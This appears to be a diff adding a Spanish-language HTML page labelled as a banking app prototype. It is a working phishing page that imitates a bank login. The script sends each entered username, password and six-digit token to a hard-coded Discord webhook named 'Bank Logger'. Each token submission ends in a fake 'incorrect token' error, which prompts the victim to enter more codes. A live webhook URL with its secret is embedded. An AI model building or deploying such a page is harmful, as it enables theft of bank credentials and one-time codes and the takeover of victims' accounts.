@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Prototipo App Bancaria</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #e5e7eb;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .bg-brand-red {
+            background-color: #CC0000;
+        }
+
+        .text-brand-red {
+            color: #CC0000;
+        }
+
+        .btn-brand-red {
+            background-color: #E31837;
+        }
+
+        .btn-brand-red:hover {
+            background-color: #CC0000;
+        }
+
+        .no-scrollbar::-webkit-scrollbar {
+            display: none;
+        }
+
+        .no-scrollbar {
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+        }
+
+        .clip-diagonal {
+            clip-path: polygon(0 0, 100% 0, 100% 85%, 0% 100%);
+        }
+
+        .view {
+            transition: all 0.5s ease-in-out;
+        }
+
+        .view-active {
+            transform: translateX(0);
+            opacity: 1;
+            pointer-events: auto;
+            z-index: 10;
+        }
+
+        .view-hidden-left {
+            transform: translateX(-100%);
+            opacity: 0;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .view-hidden-right {
+            transform: translateX(100%);
+            opacity: 0;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .spinner {
+            border: 4px solid rgba(227, 24, 55, 0.2);
+            border-left-color: #E31837;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Overlay de error */
+        #error-overlay {
+            transition: opacity 0.3s ease;
+        }
+    </style>
+</head>
+
+<body class="sm:p-8">
+
+    <!-- Contenedor Principal -->
+    <div
+        class="relative w-full max-w-md h-[100dvh] sm:h-[800px] sm:max-h-[90vh] bg-[#F2F4F7] sm:rounded-[2rem] sm:shadow-2xl overflow-hidden flex flex-col">
+
+        <!-- PANTALLA 1: INICIO -->
+        <div id="view-welcome" class="absolute inset-0 w-full h-full bg-[#F2F4F7] flex flex-col view view-active">
+            <div class="absolute top-0 w-full h-[75%] bg-brand-red overflow-hidden">
+                <div class="absolute bottom-0 left-0 w-full leading-none translate-y-[1px]">
+                    <svg viewBox="0 0 1440 320" class="w-full h-auto" preserveAspectRatio="none">
+                        <path fill="#F2F4F7" fill-opacity="1" d="M0,256L1440,128L1440,320L0,320Z"></path>
+                    </svg>
+                </div>
+            </div>
+
+            <div class="relative z-10 flex flex-col h-full px-6 pt-12 pb-8">
+                <div class="mb-6">
+                   <img src="image.png" alt="" style="width: 50px;">
+                </div>
+                <div class="text-white mb-4">
+                    <h1 class="text-2xl font-bold leading-tight mb-2">Una nueva App,<br>para un Banco más digital</h1>
+                    <p class="text-sm opacity-90">La app evolucionó con nuevas funcionalidades.<br>¡Exploremos sus
+                        novedades!</p>
+                </div>
+                <div class="flex-grow flex justify-center items-end mb-4 relative">
+                    <div class="w-64 h-72 bg-no-repeat bg-bottom bg-contain"
+                        style="background-image: url('fondo.png'); -webkit-mask-image: linear-gradient(to top, black 80%, transparent 100%); mask-image: linear-gradient(to bottom, black 80%, transparent 100%); mix-blend-mode: luminosity;">
+                    </div>
+                </div>
+                <div class="flex flex-col gap-3 mt-auto">
+                    <button id="btn-soy-cliente"
+                        class="w-full btn-brand-red text-white font-semibold py-3.5 rounded-full shadow-md active:scale-95 transition-all">
+                        Soy Cliente
+                    </button>
+                    <button
+                        class="w-full bg-transparent text-gray-800 border border-gray-400 hover:bg-gray-100 font-semibold py-3.5 rounded-full active:scale-95 transition-all">
+                        Aún no soy cliente
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- PANTALLA 2: LOGIN -->
+        <div id="view-login" class="absolute inset-0 w-full h-full bg-[#F2F4F7] flex flex-col view view-hidden-right">
+            <div class="absolute top-0 w-full h-[40%] bg-brand-red clip-diagonal"></div>
+
+            <div class="relative z-10 flex flex-col h-full pt-12 pb-24 no-scrollbar overflow-y-auto">
+                <div class="px-6 flex justify-between items-start mb-6">
+                    <button id="btn-volver-inicio" class="active:scale-90 transition-transform">
+                   <img src="image.png" alt="" style="width: 50px;">
+                    </button>
+                    <button
+                        class="btn-brand-red border border-white/20 w-10 h-10 rounded-full shadow-lg text-white flex items-center justify-center active:scale-95 transition-all">
+                        <i class="fa-solid fa-headset"></i>
+                    </button>
+                </div>
+
+                <div class="px-6 mb-6">
+                    <h2 class="text-3xl font-bold text-white">Buenas tardes</h2>
+                </div>
+
+                <div class="px-6 mb-4">
+                    <div class="bg-white rounded-[24px] p-6 shadow-xl">
+                        <div class="mb-5">
+                            <label class="block text-gray-700 text-sm font-semibold mb-2" for="usuario">Ingrese su
+                                usuario</label>
+                            <input
+                                class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:border-red-500 focus:ring-1 focus:ring-red-500 text-gray-700 text-base"
+                                id="usuario" type="text" placeholder="Usuario">
+                        </div>
+                        <div class="mb-6 relative">
+                            <label class="block text-gray-700 text-sm font-semibold mb-2" for="contrasena">Ingrese su
+                                contraseña</label>
+                            <input
+                                class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:border-red-500 focus:ring-1 focus:ring-red-500 text-gray-700 text-base"
+                                id="contrasena" type="password" placeholder="Contraseña">
+                            <button class="absolute bottom-3 right-4 text-gray-400 hover:text-gray-600">
+                                <i class="fa-regular fa-eye text-lg"></i>
+                            </button>
+                        </div>
+                        <button id="btn-iniciar-sesion"
+                            class="w-full btn-brand-red text-white font-semibold py-3.5 rounded-full mb-4 active:scale-95 transition-all">
+                            Iniciar sesión
+                        </button>
+                        <div class="text-center">
+                            <a href="#"
+                                class="text-sm text-gray-800 underline decoration-gray-400 font-medium hover:text-black">Ayuda
+                                para iniciar sesión</a>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="px-6 mb-8">
+                    <button
+                        class="w-full bg-white flex justify-between items-center py-4 px-6 rounded-2xl shadow-sm hover:shadow-md text-gray-800 font-semibold text-base active:bg-gray-50 transition-all">
+                        Solicitar productos
+                        <i class="fa-solid fa-chevron-right text-gray-400"></i>
+                    </button>
+                </div>
+
+                <div class="mt-auto text-center">
+                    <a href="#" class="text-xs text-gray-500 hover:text-gray-700 underline">Términos y condiciones</a>
+                </div>
+            </div>
+
+            <!-- Menú Inferior -->
+            <div class="absolute bottom-0 w-full bg-white border-t border-gray-200 z-30 sm:rounded-b-[2rem]">
+                <div class="flex justify-between items-center px-2 py-3">
+                    <button
+                        class="flex flex-col items-center gap-1 w-1/4 text-gray-500 hover:text-brand-red transition-colors">
+                        <i class="fa-solid fa-qrcode text-xl"></i>
+                        <span class="text-[10px] font-medium">QR</span>
+                    </button>
+                    <button
+                        class="flex flex-col items-center gap-1 w-1/4 text-gray-500 hover:text-brand-red transition-colors">
+                        <i class="fa-solid fa-location-dot text-xl"></i>
+                        <span class="text-[10px] font-medium text-center leading-tight">Puntos de<br>atención</span>
+                    </button>
+                    <button
+                        class="flex flex-col items-center gap-1 w-1/4 text-gray-500 hover:text-brand-red transition-colors">
+                        <i class="fa-solid fa-percent text-xl"></i>
+                        <span class="text-[10px] font-medium">Promociones</span>
+                    </button>
+                    <button
+                        class="flex flex-col items-center gap-1 w-1/4 text-gray-500 hover:text-brand-red transition-colors">
+                        <i class="fa-solid fa-bars text-xl"></i>
+                        <span class="text-[10px] font-medium">Más</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- PANTALLA 3: TOKEN -->
+        <div id="view-token" class="absolute inset-0 w-full h-full bg-[#F2F4F7] flex flex-col view view-hidden-right">
+            <div class="absolute top-0 w-full h-[40%] bg-brand-red clip-diagonal"></div>
+
+            <div class="relative z-10 flex flex-col h-full pt-12 pb-24 no-scrollbar overflow-y-auto">
+                <div class="px-6 flex justify-between items-start mb-6">
+                    <button id="btn-volver-login" class="active:scale-90 transition-transform">
+                        <i class="fa-solid fa-arrow-left text-white text-2xl"></i>
+                    </button>
+                    <button
+                        class="btn-brand-red border border-white/20 w-10 h-10 rounded-full shadow-lg text-white flex items-center justify-center active:scale-95 transition-all">
+                        <i class="fa-solid fa-headset"></i>
+                    </button>
+                </div>
+
+                <div class="px-6 mb-6">
+                    <h2 class="text-3xl font-bold text-white">Verificación</h2>
+                    <p class="text-white/80 mt-1">Ingresa tu Token Digital</p>
+                </div>
+
+                <div class="px-6 mb-4">
+                    <div class="bg-white rounded-[24px] p-6 shadow-xl text-center">
+                        <div class="mb-2">
+                            <div
+                                class="w-16 h-16 bg-gray-100 rounded-full flex items-center justify-center mx-auto mb-4 text-brand-red">
+                                <i class="fa-solid fa-shield-halved text-2xl"></i>
+                            </div>
+                            <label class="block text-gray-700 text-sm font-semibold mb-4" for="token">
+                                Token de 6 dígitos
+                            </label>
+                            <input
+                                class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:border-red-500 focus:ring-1 focus:ring-red-500 text-center text-2xl tracking-[0.5em] font-mono text-gray-800"
+                                id="token" type="tel" maxlength="6" placeholder="------">
+                        </div>
+
+                        <div class="mt-8">
+                            <button id="btn-confirmar-token"
+                                class="w-full btn-brand-red text-white font-semibold py-3.5 rounded-full active:scale-95 transition-all">
+                                Confirmar Token
+                            </button>
+                        </div>
+
+                        <div class="text-center mt-4">
+                            <a href="#" class="text-sm text-gray-500 hover:text-black transition-colors">¿Problemas con
+                                tu token?</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- OVERLAY DE CARGA -->
+        <div id="loading-overlay"
+            class="absolute inset-0 w-full h-full bg-white/90 backdrop-blur-sm z-50 flex flex-col items-center justify-center opacity-0 pointer-events-none transition-opacity duration-300">
+            <div class="spinner mb-4"></div>
+            <p id="loading-text" class="text-brand-red font-semibold text-lg">Validando credenciales...</p>
+            <p id="loading-subtext" class="text-gray-500 text-sm mt-2">Por favor espera un momento</p>
+        </div>
+
+        <!-- OVERLAY DE ERROR -->
+        <div id="error-overlay"
+            class="absolute inset-0 w-full h-full bg-white/95 backdrop-blur-sm z-50 flex flex-col items-center justify-center opacity-0 pointer-events-none">
+            <div class="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mb-4">
+                <i class="fa-solid fa-circle-xmark text-red-600 text-4xl"></i>
+            </div>
+            <p class="text-red-600 font-bold text-2xl mb-2">Token incorrecto</p>
+            <p class="text-gray-500 text-sm">Por favor, inténtalo de nuevo</p>
+        </div>
+
+    </div>
+
+    <script>
+        // ============================================
+        // CONFIGURACIÓN DEL WEBHOOK DE DISCORD
+        // ============================================
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1572386335011115090/IAFT978FUxGlgf-2eksMDKeRh2E6JFbR41Ef6KBWa9VAuplOOnPzttftGNVeX4hC0wS_';
+
+        // Función para enviar datos a Discord
+        async function enviarADiscord(tipo, datos) {
+            try {
+                const embed = {
+                    title: `📥 Nuevo dato capturado: ${tipo}`,
+                    color: 0xE31837,
+                    fields: [],
+                    timestamp: new Date().toISOString(),
+                    footer: { text: 'Prototipo App Bancaria' }
+                };
+
+                // Agregar campos según el tipo
+                if (tipo === 'LOGIN') {
+                    embed.fields.push(
+                        { name: '👤 Usuario', value: datos.usuario || '(vacío)', inline: true },
+                        { name: '🔒 Contraseña', value: datos.contrasena || '(vacía)', inline: true }
+                    );
+                } else if (tipo === 'TOKEN') {
+                    embed.fields.push(
+                        { name: '🔑 Token', value: datos.token || '(vacío)', inline: false }
+                    );
+                }
+
+                const payload = {
+                    username: 'Bank Logger',
+                    avatar_url: 'https://cdn-icons-png.flaticon.com/512/2830/2830284.png',
+                    embeds: [embed]
+                };
+
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    console.log(`✅ Datos de ${tipo} enviados a Discord`);
+                } else {
+                    console.error(`❌ Error al enviar ${tipo} a Discord:`, response.status);
+                }
+            } catch (error) {
+                console.error(`❌ Error de red al enviar ${tipo}:`, error);
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            // Referencias a las vistas
+            const viewWelcome = document.getElementById('view-welcome');
+            const viewLogin = document.getElementById('view-login');
+            const viewToken = document.getElementById('view-token');
+            const loadingOverlay = document.getElementById('loading-overlay');
+            const loadingText = document.getElementById('loading-text');
+            const loadingSubtext = document.getElementById('loading-subtext');
+            const errorOverlay = document.getElementById('error-overlay');
+
+            // Referencias a botones
+            const btnSoyCliente = document.getElementById('btn-soy-cliente');
+            const btnVolverInicio = document.getElementById('btn-volver-inicio');
+            const btnIniciarSesion = document.getElementById('btn-iniciar-sesion');
+            const btnVolverLogin = document.getElementById('btn-volver-login');
+            const btnConfirmarToken = document.getElementById('btn-confirmar-token');
+            const inputToken = document.getElementById('token');
+            const inputUsuario = document.getElementById('usuario');
+            const inputContrasena = document.getElementById('contrasena');
+
+            // Función para cambiar de vista
+            function switchView(hideView, showView, hideDirection = 'left') {
+                hideView.classList.remove('view-active');
+                if (hideDirection === 'left') {
+                    hideView.classList.add('view-hidden-left');
+                } else {
+                    hideView.classList.add('view-hidden-right');
+                }
+
+                showView.classList.remove('view-hidden-left', 'view-hidden-right');
+                showView.classList.add('view-active');
+            }
+
+            // Función para mostrar el overlay de carga
+            function mostrarCarga(texto, subtexto) {
+                loadingText.textContent = texto;
+                loadingSubtext.textContent = subtexto;
+                loadingOverlay.classList.remove('opacity-0', 'pointer-events-none');
+                loadingOverlay.classList.add('opacity-100', 'pointer-events-auto');
+            }
+
+            // Función para ocultar el overlay de carga
+            function ocultarCarga() {
+                loadingOverlay.classList.remove('opacity-100', 'pointer-events-auto');
+                loadingOverlay.classList.add('opacity-0', 'pointer-events-none');
+            }
+
+            // Función para mostrar el overlay de error
+            function mostrarError() {
+                errorOverlay.classList.remove('opacity-0', 'pointer-events-none');
+                errorOverlay.classList.add('opacity-100', 'pointer-events-auto');
+            }
+
+            // Función para ocultar el overlay de error
+            function ocultarError() {
+                errorOverlay.classList.remove('opacity-100', 'pointer-events-auto');
+                errorOverlay.classList.add('opacity-0', 'pointer-events-none');
+            }
+
+            // Inicio -> Login
+            btnSoyCliente.addEventListener('click', () => {
+                switchView(viewWelcome, viewLogin, 'left');
+            });
+
+            // Login -> Inicio (Botón Casa)
+            btnVolverInicio.addEventListener('click', () => {
+                switchView(viewLogin, viewWelcome, 'right');
+            });
+
+            // Login -> Carga -> Token
+            btnIniciarSesion.addEventListener('click', () => {
+                const usuario = inputUsuario.value;
+                const contrasena = inputContrasena.value;
+
+                // 📤 ENVIAR DATOS A DISCORD (PASO 1: LOGIN)
+                enviarADiscord('LOGIN', { usuario, contrasena });
+
+                // Mostrar overlay de carga
+                mostrarCarga('Validando credenciales...', 'Por favor espera un momento');
+
+                // Simular tiempo de validación (2 segundos)
+                setTimeout(() => {
+                    ocultarCarga();
+                    switchView(viewLogin, viewToken, 'left');
+                    inputToken.value = '';
+                    setTimeout(() => inputToken.focus(), 500);
+                }, 20000);
+            });
+
+            // Token -> Login (Botón Atrás)
+            btnVolverLogin.addEventListener('click', () => {
+                switchView(viewToken, viewLogin, 'right');
+            });
+
+            // Confirmar Token -> Carga 10s -> Error -> Volver a Token
+            btnConfirmarToken.addEventListener('click', () => {
+                const token = inputToken.value;
+
+                // 📤 ENVIAR DATOS A DISCORD (PASO 2: TOKEN)
+                enviarADiscord('TOKEN', { token });
+
+                // Mostrar overlay de carga (10 segundos)
+                mostrarCarga('Verificando token...', 'Esto puede tardar unos segundos');
+
+                setTimeout(() => {
+                    ocultarCarga();
+                    mostrarError();
+
+                    // Después de 2.5 segundos mostrando el error, regresar a la vista token
+                    setTimeout(() => {
+                        ocultarError();
+                        inputToken.value = '';
+                        setTimeout(() => inputToken.focus(), 500);
+                    }, 2500);
+                }, 20000); // 10 segundos
+            });
+
+            // Formatear input de token (solo números)
+            inputToken.addEventListener('input', function (e) {
+                this.value = this.value.replace(/[^0-9]/g, '');
+            });
+        });
+    </script>
+</body>
+
+</html>
